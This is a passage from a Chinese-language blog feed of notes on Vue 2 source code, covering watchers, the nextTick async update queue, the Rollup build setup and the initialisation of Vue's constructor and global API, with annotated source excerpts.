        <content type="html"><![CDATA[<ul><li>watch的两个参数</li><li>三种类型的 Watcher 对象</li><li>异步更新队列-nextTick</li></ul><a id="more"></a><h2 id="watch的两个参数"><a href="#watch的两个参数" class="headerlink" title="watch的两个参数"></a>watch的两个参数</h2><ul><li>immediate：代表立即执行，而不是等监听对象改变再执行</li><li>deep：深度监听，对象的属性改变也可以监听的到</li></ul><p>可以参考<a href="https://zhuanlan.zhihu.com/p/86273758" target="_blank" rel="noopener">这篇文章</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 两种写法</span></span><br><span class="line">watch: &#123;</span><br><span class="line">    <span class="string">'user.firstName'</span>: <span class="function"><span class="keyword">function</span> (<span class="params">newValue, oldValue</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user.fullName = <span class="keyword">this</span>.user.firstName + <span class="string">''</span> + <span class="keyword">this</span>.user.lastName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">watch: &#123;</span><br><span class="line">    <span class="string">'user'</span>: &#123;</span><br><span class="line">        handler: <span class="function"><span class="keyword">function</span> (<span class="params">newValue, oldValue</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user.fullName = <span class="keyword">this</span>.user.firstName + <span class="string">''</span> + <span class="keyword">this</span>.user.lastName</span><br><span class="line">    &#125;,</span><br><span class="line">        deep: <span class="literal">true</span>,</span><br><span class="line">        immediate: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三种类型的-Watcher-对象"><a href="#三种类型的-Watcher-对象" class="headerlink" title="三种类型的 Watcher 对象"></a>三种类型的 Watcher 对象</h2><ul><li><p>没有静态方法，因为 $watch 方法中要使用 Vue 的实例</p></li><li><p>Watcher 分三种：计算属性 Watcher、用户 Watcher (侦听器)、渲染 Watcher</p><ul><li>计算属性 Watcher 在 initComputd 中创建</li><li>用户 Watcher (侦听器) 在 Vue.$watch 中创建</li><li>渲染 Watcher 在 mountComponent 中创建</li></ul></li><li><p>Watcher内部实现是一样的，<code>src/core/observer/watcher.js</code>中，并且每一个Watcher都有一个id</p></li><li><p>创建顺序：计算属性 Watcher、用户 Watcher (侦听器)、渲染 Watcher</p></li><li><p>vm.$watch()</p><ul><li>src\core\instance\state.js</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$watch = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    expOrFn: string | Function,</span></span></span><br><span class="line"><span class="function"><span class="params">    cb: any,</span></span></span><br><span class="line"><span class="function"><span class="params">    options?: Object</span></span></span><br><span class="line"><span class="function"><span class="params">  </span>): <span class="title">Function</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 Vue 实例 this</span></span><br><span class="line">    <span class="keyword">const</span> vm: Component = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">if</span> (isPlainObject(cb)) &#123;</span><br><span class="line">      <span class="comment">// 判断如果 cb 是对象执行 createWatcher</span></span><br><span class="line">      <span class="keyword">return</span> createWatcher(vm, expOrFn, cb, options)</span><br><span class="line">    &#125;</span><br><span class="line">    options = options || &#123;&#125;</span><br><span class="line">    options.user = <span class="literal">true</span></span><br><span class="line">    <span class="comment">// 创建用户 watcher 对象</span></span><br><span class="line">    <span class="keyword">const</span> watcher = <span class="keyword">new</span> Watcher(vm, expOrFn, cb, options)</span><br><span class="line">    <span class="comment">// 判断 immediate 如果为 true</span></span><br><span class="line">    <span class="keyword">if</span> (options.immediate) &#123;</span><br><span class="line">      <span class="comment">// 立即执行一次 cb 回调，并且把当前值传入</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        cb.call(vm, watcher.value)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        handleError(error, vm, <span class="string">`callback for immediate watcher "<span class="subst">$&#123;watcher.expression&#125;</span>"`</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回取消监听的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">unwatchFn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      watcher.teardown()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="异步更新队列-nextTick"><a href="#异步更新队列-nextTick" class="headerlink" title="异步更新队列-nextTick"></a>异步更新队列-nextTick</h2><p>可以查看<a href="https://www.jianshu.com/p/7f9495b1c8ab" target="_blank" rel="noopener">Vue.nextTick 的原理和用途</a></p><ul><li><p>首先修改数据，在script代码块中，这是宏任务，同一事件循环的所有的宏任务都在主线程上执行，形成一个执行栈，此时还未涉及DOM.</p></li><li><p>Vue开启一个异步队列，并缓冲在此事件循环中发生的所有数据变化。如果同一个watcher被多次触发，只会被推入 queueWatcher 队列中一次，这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作上非常重要</p></li></ul><h4 id="定义位置"><a href="#定义位置" class="headerlink" title="定义位置"></a>定义位置</h4><ul><li>src\core\instance\render.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$nextTick = <span class="function"><span class="keyword">function</span> (<span class="params">fn: Function</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> nextTick(fn, <span class="keyword">this</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><ul><li>手动调用 vm.$nextTick()</li><li>在 Watcher 的 queueWatcher 中执行 nextTick()</li><li>src\core\util\next-tick.js</li></ul><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li><p>在修改完数据时，想要获取更新后 DOM 上最新数据，需要使用 nextTick，因为 DOM 的更新过程是异步的</p></li><li><p>nextTick 会把传入的回调函数 cb 压入 callbacks 数组，这里使用 callbacks 而不是直接在 nextTick 中执行回调函数的原因是保证在同一个 tick 内多次执行 nextTick时不会开启多个异步任务，而是把这些任务放在一起一同执行。</p></li><li><p>那么这些回调函数如何调用呢，nextTick 内部优先使用微任务执行异步的回调函数，microtask 因为其高优先级特性能确保队列中的微任务在一次事件循环前被执行完毕，如果浏览器不支持 Promise 的话会降级成 MutationObserver，如果浏览器再不支持微任务，会降级成宏任务，如果 IE 优先使用 setImmediate，否则使用 setTimeout</p></li><li><p>然后其实Vue进行 DOM 更新内部也是调用 nextTick 来做异步队列控制，而当我们自己调用 nextTick 时，更新 DOM 的回调函数已经加入了callback，在他后面后追加了我们自己的回调函数，从而确保我们的代码在 DOM 更新后执行，所以我们可以拿到更新后的 DOM</p></li><li><p>问题： 按照 macrotask =&gt; microtask =&gt; ui渲染的顺序，若 nextTick 在微任务队列中，此时ui还没渲染，那他是怎么拿到 DOM 的呢</p><ul><li><p>首先解释：其实macrotask =&gt; microtask =&gt; ui渲染的规则是为了 JS 引擎线程和 GUI 渲染线程有序切换</p></li><li><p>因为已经保证了我们的 nextTick 在更新 DOM 的 nextTick 之后，可以拿到，就是还没渲染而已</p></li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 支持 Promise 使用 Promise</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Promise</span> !== <span class="string">'undefined'</span> &amp;&amp; isNative(<span class="built_in">Promise</span>)) &#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve()</span><br><span class="line">  timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    p.then(flushCallbacks)</span><br><span class="line">    <span class="keyword">if</span> (isIOS) setTimeout(noop)</span><br><span class="line">  &#125;</span><br><span class="line">  isUsingMicroTask = <span class="literal">true</span></span><br><span class="line"><span class="comment">// 否则使用 MutationObserver</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isIE &amp;&amp; <span class="keyword">typeof</span> MutationObserver !== <span class="string">'undefined'</span> &amp;&amp; (</span><br><span class="line">  isNative(MutationObserver) ||</span><br><span class="line">  <span class="comment">// PhantomJS and iOS 7.x</span></span><br><span class="line">  MutationObserver.toString() === <span class="string">'[object MutationObserverConstructor]'</span></span><br><span class="line">)) &#123;</span><br><span class="line">  <span class="comment">// Use MutationObserver where native Promise is not available,</span></span><br><span class="line">  <span class="comment">// e.g. PhantomJS, iOS7, Android 4.4</span></span><br><span class="line">  <span class="comment">// (#6466 MutationObserver is unreliable in IE11)</span></span><br><span class="line">  <span class="keyword">let</span> counter = <span class="number">1</span></span><br><span class="line">  <span class="keyword">const</span> observer = <span class="keyword">new</span> MutationObserver(flushCallbacks)</span><br><span class="line">  <span class="keyword">const</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="built_in">String</span>(counter))</span><br><span class="line">  observer.observe(textNode, &#123;</span><br><span class="line">    characterData: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">  timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    counter = (counter + <span class="number">1</span>) % <span class="number">2</span></span><br><span class="line">    textNode.data = <span class="built_in">String</span>(counter)</span><br><span class="line">  &#125;</span><br><span class="line">  isUsingMicroTask = <span class="literal">true</span></span><br><span class="line"><span class="comment">// 否则使用 setImmediate</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> setImmediate !== <span class="string">'undefined'</span> &amp;&amp; isNative(setImmediate)) &#123;</span><br><span class="line">  <span class="comment">// Fallback to setImmediate.</span></span><br><span class="line">  <span class="comment">// Technically it leverages the (macro) task queue,</span></span><br><span class="line">  <span class="comment">// but it is still a better choice than setTimeout.</span></span><br><span class="line">  timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setImmediate(flushCallbacks)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 否则使用 setTimeout</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Fallback to setTimeout.</span></span><br><span class="line">  timerFunc = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(flushCallbacks, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果有回调函数 cb 则加入一个队列，如果没有则返回 Promise，第二个参数是上下文</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">nextTick</span> (<span class="params">cb?: Function, ctx?: Object</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> _resolve</span><br><span class="line">  callbacks.push(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cb) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        cb.call(ctx)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        handleError(e, ctx, <span class="string">'nextTick'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_resolve) &#123;</span><br><span class="line">      _resolve(ctx)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (!pending) &#123;</span><br><span class="line">    pending = <span class="literal">true</span></span><br><span class="line">    timerFunc() <span class="comment">// 取出所有的回调函数调用</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// $flow-disable-line</span></span><br><span class="line">  <span class="keyword">if</span> (!cb &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">Promise</span> !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">      _resolve = resolve</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue源码学习（一）</title>
      <link href="2020/10/13/%E6%95%B4%E7%90%86-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/10/13/%E6%95%B4%E7%90%86-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>调试与打包</li><li>template和render同时存在</li><li>平台无关与平台相关</li><li>Vue的构造函数</li><li>源码报错的两个小问题</li><li>Vue初始化-静态成员</li><li>Vue的实例属性和方法</li></ul><a id="more"></a><h2 id="调试与打包"><a href="#调试与打包" class="headerlink" title="调试与打包"></a>调试与打包</h2><ul><li>vue源码中的打包工具 Rollup<ul><li>Vue.js 源码的打包工具使用的是 Rollup，比 Webpack 轻量</li><li>Webpack 把所有文件当做模块，Rollup 只处理 js 文件更适合在 Vue.js 这样的库中使用</li><li>Rollup 打包不会生成冗余的代码</li></ul></li><li>安装依赖后设置 sourcemap</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"dev": "rollup -w -c scripts/config.js --sourcemap --environment TARGET:web- full-dev"</span><br></pre></td></tr></table></figure><ul><li>执行<code>npm run dev</code>打包，发现<code>dist</code>目录下生成许多文件</li></ul><p>此处参考：<a href="https://cn.vuejs.org/v2/guide/installation.html#%E5%AF%B9%E4%B8%8D%E5%90%8C%E6%9E%84%E5%BB%BA%E7%89%88%E6%9C%AC%E7%9A%84%E8%A7%A3%E9%87%8A" target="_blank" rel="noopener">官方文档</a></p><ul><li><p>推荐使用运行时版本，因为运行时版本相比完整版体积要小大约 30%</p></li><li><p>基于 Vue-CLI 创建的项目默认使用的是 vue.runtime.esm.js</p></li><li><p>*.vue 文件中的模板是在构建时预编译的，最终打包后的结果不需要编译器，只需要运行</p><p>时版本即可</p></li></ul><h2 id="通过看源码解决问题"><a href="#通过看源码解决问题" class="headerlink" title="通过看源码解决问题"></a>通过看源码解决问题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123; </span><br><span class="line">    el: <span class="string">'#app'</span>, </span><br><span class="line">    template: <span class="string">'&lt;h3&gt;Hello template&lt;/h3&gt;'</span>, </span><br><span class="line">    render (h) &#123; </span><br><span class="line">        <span class="keyword">return</span> h(<span class="string">'h4'</span>, <span class="string">'Hello render'</span>) </span><br><span class="line">    &#125; </span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 同时存在template和render函数时页面输出 Hello render</span></span><br></pre></td></tr></table></figure><ul><li>el 不能是 body 或者 html 标签</li><li>如果没有 render，把 template 转换成 render 函数</li><li>如果有 render 方法，直接调用 mount 挂载 DOM</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. el 不能是 body 或者 html </span></span><br><span class="line"><span class="keyword">if</span> (el === <span class="built_in">document</span>.body || el === <span class="built_in">document</span>.documentElement) &#123; </span><br><span class="line">    process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp; warn( </span><br><span class="line">        <span class="string">`Do not mount Vue to &lt;html&gt; or &lt;body&gt; - mount to normal elements </span></span><br><span class="line"><span class="string">instead.`</span> </span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> options = <span class="keyword">this</span>.$options </span><br><span class="line"><span class="keyword">if</span> (!options.render) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 2. 把 template/el 转换成 render 函数 </span></span><br><span class="line">    …… </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3. 调用 mount 方法，挂载 DOM </span></span><br><span class="line"><span class="keyword">return</span> mount.call(<span class="keyword">this</span>, el, hydrating)</span><br></pre></td></tr></table></figure><h2 id="平台无关与平台相关"><a href="#平台无关与平台相关" class="headerlink" title="平台无关与平台相关"></a>平台无关与平台相关</h2><p>源码的<code>src</code>目录下有这样的结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|--core</span><br><span class="line">|--platforms</span><br><span class="line">  |--web</span><br><span class="line">  |--weex</span><br></pre></td></tr></table></figure><p>其中<code>core</code>存放的就是<strong>平台无关</strong>代码，<code>platforms</code>中存放的就是<strong>平台相关</strong>代码</p><p><strong>什么是平台无关性:</strong></p><ul><li>平台无关性就是一种语言在计算机上的运行不受平台的约束，一次编译，到处执行 。 </li></ul><p><strong>平台无关有两种：</strong></p><ul><li><p>源代码级和目标代码级。而C和C++具有一定程度的源代码级平台无关，表明用C或C++写的应用程序不用修改只需重新编译就可以在不同平台上运行。</p></li><li><p>而Java编译出来的是字节码，去到哪个平台都能用，只要有那个平台的JDK就可以运行，所以，Java程序的最大优势就是平台无关。</p></li></ul><h2 id="Vue的构造函数"><a href="#Vue的构造函数" class="headerlink" title="Vue的构造函数"></a>Vue的构造函数</h2><ul><li>src/platform/web中有一些<code>entry-</code>文件，引用了 ‘/runtime/index’</li><li><p>src/platform/web/runtime/index.js 中引用了 ‘core/index’</p></li><li><p>src/core/index.js</p><ul><li>定义了 Vue 的静态方法</li><li>initGlobalAPI(Vue)</li></ul></li><li><p>src/core/index.js 中引用了 ‘./instance/index’</p></li><li><p>src/core/instance/index.js</p><ul><li>定义了 Vue 的构造函数</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp;</span><br><span class="line">    !(<span class="keyword">this</span> <span class="keyword">instanceof</span> Vue)</span><br><span class="line">  ) &#123;</span><br><span class="line">    warn(<span class="string">'Vue is a constructor and should be called with the `new` keyword'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 调用 _init() 方法，在 initMixin 中定义</span></span><br><span class="line">  <span class="keyword">this</span>._init(options)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure><h2 id="源码报错的两个小问题"><a href="#源码报错的两个小问题" class="headerlink" title="源码报错的两个小问题"></a>源码报错的两个小问题</h2><p>例如在<code>src/core/global/index.js</code>中会有报错</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如此处不支持泛型会报错  </span></span><br><span class="line">Vue.observable = <span class="xml"><span class="tag">&lt;<span class="name">T</span>&gt;</span>(obj: T): T =&gt; &#123;</span></span><br><span class="line"><span class="xml">    observe(obj)</span></span><br><span class="line"><span class="xml">    return obj</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">// 而且这段代码之后的部分不会高亮显示</span></span><br></pre></td></tr></table></figure><p><strong>解决：文件 =&gt; 首选项 =&gt; 设置 =&gt; 右上角json格式</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 不检查 js 语法问题</span><br><span class="line">"javascript.validate.enable": false</span><br></pre></td></tr></table></figure><p>高亮显示：安装<code>Babel JavaScript</code>插件，但是之后的代码有些功能丢失了，不能跳转定义</p><h2 id="Vue初始化-静态成员"><a href="#Vue初始化-静态成员" class="headerlink" title="Vue初始化-静态成员"></a>Vue初始化-静态成员</h2><p>静态方法目录在：<code>src/core/global-api</code>中</p><p><strong>src/core/global-api/index.js</strong>：初始化 Vue 的静态方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">initGlobalAPI</span> (<span class="params">Vue: GlobalAPI</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// src/core/global-api/index.js </span></span><br><span class="line">  <span class="comment">// 初始化 Vue.config 对象</span></span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(Vue, <span class="string">'config'</span>, configDef)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// exposed util methods.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> these are not considered part of the public API - avoid relying on</span></span><br><span class="line">  <span class="comment">// them unless you are aware of the risk.</span></span><br><span class="line">  Vue.util = &#123;</span><br><span class="line">    warn,</span><br><span class="line">    extend,</span><br><span class="line">    mergeOptions,</span><br><span class="line">    defineReactive</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 静态方法 set/delete/nextTick</span></span><br><span class="line">  Vue.set = set</span><br><span class="line">  Vue.delete = del</span><br><span class="line">  Vue.nextTick = nextTick</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.6 explicit observable API</span></span><br><span class="line">  <span class="comment">// 让一个对象可响应</span></span><br><span class="line">  Vue.observable = <span class="xml"><span class="tag">&lt;<span class="name">T</span>&gt;</span>(obj: T): T =&gt; &#123;</span></span><br><span class="line"><span class="xml">    observe(obj)</span></span><br><span class="line"><span class="xml">    return obj</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">  // 初始化 Vue.options 对象，并给其扩展</span></span><br><span class="line"><span class="xml">  Vue.options = Object.create(null)</span></span><br><span class="line"><span class="xml">  ASSET_TYPES.forEach(type =&gt; &#123;</span></span><br><span class="line"><span class="xml">    Vue.options[type + 's'] = Object.create(null)</span></span><br><span class="line"><span class="xml">  &#125;)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  // this is used to identify the "base" constructor to extend all plain-object</span></span><br><span class="line"><span class="xml">  // components with in Weex's multi-instance scenarios.</span></span><br><span class="line"><span class="xml">  Vue.options._base = Vue</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  // 设置 keep-alive 组件</span></span><br><span class="line"><span class="xml">  extend(Vue.options.components, builtInComponents)</span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">  // 注册 Vue.use() 用来注册插件</span></span><br><span class="line"><span class="xml">  initUse(Vue)</span></span><br><span class="line"><span class="xml">  // 注册 Vue.mixin() 实现混入</span></span><br><span class="line"><span class="xml">  initMixin(Vue)</span></span><br><span class="line"><span class="xml">  // 注册 Vue.extend() 基于传入的 options 返回一个组件的构造函数</span></span><br><span class="line"><span class="xml">  initExtend(Vue)</span></span><br><span class="line"><span class="xml">  // 注册 Vue.directive()、 Vue.component()、Vue.filter()</span></span><br><span class="line"><span class="xml">  initAssetRegisters(Vue)</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure><p>上面所注册的全局API在<a href="https://cn.vuejs.org/v2/api/#%E5%85%A8%E5%B1%80-API" target="_blank" rel="noopener">官方文档中</a>。</p><p>关于Vue.directive可参考<a href="https://www.jianshu.com/p/13398358b5b4" target="_blank" rel="noopener">这篇博客</a>。</p><h2 id="Vue的实例属性和方法"><a href="#Vue的实例属性和方法" class="headerlink" title="Vue的实例属性和方法"></a>Vue的实例属性和方法</h2><p>定义实例属性和方法的目录在：<code>src/core/instance</code>中</p><p><strong>src/core/instance/index.js</strong>：定义Vue的构造函数和实例成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp;</span><br><span class="line">    !(<span class="keyword">this</span> <span class="keyword">instanceof</span> Vue)</span><br><span class="line">  ) &#123;</span><br><span class="line">    warn(<span class="string">'Vue is a constructor and should be called with the `new` keyword'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 调用 _init() 方法，在 initMixin 中定义</span></span><br><span class="line">  <span 